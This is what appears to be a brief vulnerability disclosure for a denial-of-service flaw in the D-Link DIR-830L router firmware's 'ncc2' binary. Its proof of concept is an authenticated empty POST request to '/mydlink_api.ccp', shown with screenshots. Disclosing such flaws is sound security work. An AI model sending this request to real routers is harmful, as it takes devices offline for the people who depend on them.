# Summary
There is a denial of service vulnerability in `ncc2` binary file of D-Link DIR830LA1_FW100B07.

Fimware download link : https://legacyfiles.us.dlink.com/DIR-830L/REVA/FIRMWARE/DIR-830L_REVA_FIRMWARE_1.00B07.ZIP

Affected component is `callback_ccp_mydlink_api` and `mydlink_api.ccp`.

# Details
```
POST /mydlink_api.ccp
```

Post this packet without any payload will lead to DoS:
![DIR830-DoS](https://github.com/user-attachments/assets/d8178140-0aab-44f9-9302-02886c5252a4)


# PoC
**Login** first to get your cookie.

```
POST /mydlink_api.ccp
```
![DIR830-DoS](https://github.com/user-attachments/assets/d8178140-0aab-44f9-9302-02886c5252a4)
